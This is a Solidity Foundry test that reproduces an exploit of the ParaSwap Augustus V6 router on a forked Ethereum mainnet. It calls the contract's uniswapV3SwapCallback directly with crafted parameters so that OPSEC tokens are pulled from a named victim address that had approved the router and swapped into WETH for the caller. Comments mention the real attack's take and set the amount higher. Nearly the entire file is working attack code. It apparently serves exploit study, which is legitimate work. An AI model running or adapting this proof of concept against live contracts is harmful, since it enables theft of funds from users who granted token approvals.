// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "./IParaSwap.sol";

IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
IERC20 constant OPSEC = IERC20(0x6A7eFF1e2c355AD6eb91BEbB5ded49257F3FED98);
IERC20 constant wTAO = IERC20(0x77E06c9eCCf2E797fd462A92B6D7642EF85b0A44);
IParaSwapAugustusV6 constant AugustusV6 = IParaSwapAugustusV6(
    0x00000000FdAC7708D0D360BDDc1bc7d097F47439
);
// User who had provided approval for Augustus V6 contract
// Amount of OPSEC will be transferred from this user
address constant from = 0x0cc396F558aAE5200bb0aBB23225aCcafCA31E27;

contract ParaSwapTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19470560);
        vm.label(address(WETH), "WETH");
        vm.label(address(OPSEC), "OPSEC");
        vm.label(address(wTAO), "wTAO");
        vm.label(address(AugustusV6), "AugustusV6");
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print(
            "WETH balance before",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );
        print(
            "Victim OPSEC balance before",
            OPSEC.balanceOf(from),
            OPSEC.decimals()
        );
        print(
            "Victim approved OPSEC amount",
            OPSEC.allowance(from, address(AugustusV6)),
            OPSEC.decimals()
        );

        // Amount0Delta negative value can be arbitrary up to 0
        int256 amount0Delta = 0;
        // In the attack tx 6_463_332_789_527_457_985 amount of WETH was transferred to the exploiter (frontran by whitehat)
        // Let's try more -> 10 WETH
        int256 amount1Delta = 10e18;
        uint256 fee1 = 3_000;
        uint256 fee2 = 10_000;
        bytes32 encodedOPSECAddr = 0x8000000000000000000000006a7eff1e2c355ad6eb91bebb5ded49257f3fed98;
        bytes memory data = abi.encode(
            address(this), //to
            from,
            address(wTAO),
            address(WETH),
            fee1,
            encodedOPSECAddr,
            address(WETH),
            fee2
        );

        AugustusV6.uniswapV3SwapCallback(amount0Delta, amount1Delta, data);

        print(
            "Victim OPSEC balance after",
            OPSEC.balanceOf(address(from)),
            OPSEC.decimals()
        );

        print(
            "Victim approved OPSEC amount after",
            OPSEC.allowance(from, address(AugustusV6)),
            OPSEC.decimals()
        );

        print(
            "Exploiter WETH balance after",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );
    }
}
